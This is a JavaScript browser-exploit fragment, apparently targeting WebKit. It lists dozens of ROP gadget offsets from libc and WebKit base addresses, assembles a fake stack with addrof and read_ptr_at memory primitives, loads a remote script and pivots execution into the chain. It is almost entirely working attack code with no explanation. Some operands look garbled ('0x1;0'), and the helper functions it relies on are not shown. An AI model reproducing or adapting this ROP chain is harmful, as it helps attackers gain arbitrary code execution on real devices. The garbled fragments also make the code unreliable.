_4GB=4294967296;
lb=libc_base;
wb=webkit_base;
a=lb+788575;   //pop rax
b=wb+14461559; //mov [rax], rdi
c=lb+206806;   //pop rdi
d=lb+793877;   //pop rsi
e=lb+248252;   //sub rdi, rsi ; mov rdx, rdi
f=lb+471355;   //mov [rdi], rax
g=lb+811575;   //pop rsp
h=lb+882884;   //mov rax, rcx
i=wb+7438103;  //mov [rsi], rax
j=lb+759626;   //mov rax, r8
k=wb+432898;   //pop r8
l=lb+50775;    //mov rax, rdi
m=lb+792472;   //pop rcx
n=lb+547636;   //add rax, rsi
o=lb+270800;   //mov ax, [rdi]
p=wb+3750700;  //pop r11 ; mov rax, rdi
q=lb+877546;   //shl rax, cl
r=lb+523896;   //sar edi, cl
s=wb+1786005;  //mov rax, r11
t=wb+6227286;  //movsxd rax, edi
u=lb+877568;   //shr rax, cl
v=lb+191168;   //mov rax, [rdi]
w=wb+75236;    //or rax, rcx
x=lb+191169;   //mov eax, [rdi]
y=wb+5202439;  //and rax, rcx
z=wb+2997875;  //mov [rax], rcx
A=wb+954100;   //mov [rax], ecx
B=wb+14959219; //cmp rax, rcx ; sete al
C=wb+48555;    //setl al
D=lb+269973;   //movzx eax, al
E=wb+11676600; //cmp rax, rsi ; sete al
F=wb+414627;   //shl rax, 3
G=lb+186490;   //mov rax, [rax]
H=lb+877175;   //sub rax, rcx ; sbb rdx, rcx
I=wb+1838146;  //add rax, rcx
J=lb+270096;   //mov al, [rdi]
K=wb+865136;   //mov [rax], cl
L=wb+1506828;  //imul rax, rcx
M=lb+272260;   //mov rax, rsi
N=lb+877877;   //mov rax, rdx
O=wb+8975893;  //mov [rdi + 0x1;0], r8
P=wb+1026352;  //mov [rdi + 0x1;0], r9
Q=lb+785097;   //mov rsp, rbp ; pop rbp
R=wb+8824269;  //setle al
S=lb+389047;   //setne al
T=wb+105267;   //pop rdx
U=wb+10235455; //pop r9
V=lb+785193;   //xor rax, rax
W=lb+11;       //nop
X=lb+562536;   //mov [rdi], cx
Y=lb+547950;   //mov rcx, [rdi + 0x1;8] ; lea rax, [rax + rcx - 1]
Z=lb+582033;
_0=lb+785347;

alfa=[...'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'];
valores=Array(41);
for(_i=0;_i<valores.length;_i++)
	valores[_i]=_i;
valores.push(56,128,168,176,184,192,200,208,312,4096,15651,65280,65536,16777343,
-0x1,-0x8,-0xc,-0xd,-0x10,-0x14,-0x18,-0x1c,-0x1e,-0x1f,-0x20,-0x24,-0x26,-0x27,-0x28,-0x2c,
-0x30,-0x34,-0x38,-0x50,-0x68,-0xb8,-0xc0,-0xc8,-0xd0,-0xd8,-0xe0,-0x838);
for(_i=0;_i<valores.length;_i++)
	eval('x'+alfa[_i]+'=db(['+((valores[_i]<0)?(_4GB+valores[_i])+','+(_4GB-1):valores[_i]+',0')+']);');

x0=db([8, 0]);                   //0x8
x1=db([4294967295, 4294967295]); //-0x1
x2=db([0, 0]);                   //0x0
x3=db([16, 0]);                  //0x10
x4=db([48, 0]);                  //0x30
x5=db([4294967288, 4294967295]); //-0x8
x6=db([32, 0]);                  //0x20
x7=db([24, 0]);                  //0x18
x8=db([16711680, 0]);            //0xff0000
x9=db([65280, 0]);               //0xff00
xa=db([4294967284, 4294967295]); //-0xc
xb=db([4, 0]);                   //0x4
xc=db([7, 0]);                   //0x7
xd=db([4294967283, 4294967295]); //-0xd
xe=db([1, 0]);                   //0x1
xf=db([40, 0]);                  //0x28
xg=db([9, 0]);                   //0x9
xh=db([6, 0]);                   //0x6
xi=db([10, 0]);                  //0xa
xj=db([11, 0]);                  //0xb
xk=db([12, 0]);                  //0xc
xl=db([13, 0]);                  //0xd
xm=db([5, 0]);                   //0x5
xn=db([14, 0]);                  //0xe
xo=db([15, 0]);                  //0xf
xp=db([17, 0]);                  //0x11
xq=db([18, 0]);                  //0x12
xr=db([19, 0]);                  //0x13
xs=db([20, 0]);                  //0x14
xt=db([21, 0]);                  //0x15
xu=db([3, 0]);                   //0x3
xv=db([22, 0]);                  //0x16
xw=db([23, 0]);                  //0x17
xx=db([25, 0]);                  //0x19
xy=db([26, 0]);                  //0x1a
xz=db([27, 0]);                  //0x1b
y0=db([28, 0]);                  //0x1c
y1=db([29, 0]);                  //0x1d
y2=db([30, 0]);                  //0x1e
y3=db([31, 0]);                  //0x1f
y4=db([37, 0]);                  //0x25

rca = new Uint32Array(size);
rc = read_ptr_at(addrof(rca)+0x1;0);
rco = 2;
}	
function sg(v){
	rca[rco++] = v | 0;
	rca[rco++] = (v / _4GB) | 0;
}
function sgs(l){
for(i = 0; i < l.length; i++)
	sg(l[i]);
}
function db(d){
	for(i = 0; i < d.length; i++)
		rca[rco++] = d[i];
}
mr = malloc(8);
pb = malloc(65536);
__swbuf_addr = 0;

loadScript(url);

pivot(rc);
mr = read_ptr_at(mr);
pbe = read_ptr_at(rc+pbo);
pa = read_mem_as_string(pb, pbe - pb);
_ = malloc_nogc.pop();
_ = malloc_nogc.pop();
_ = malloc_nogc.pop();
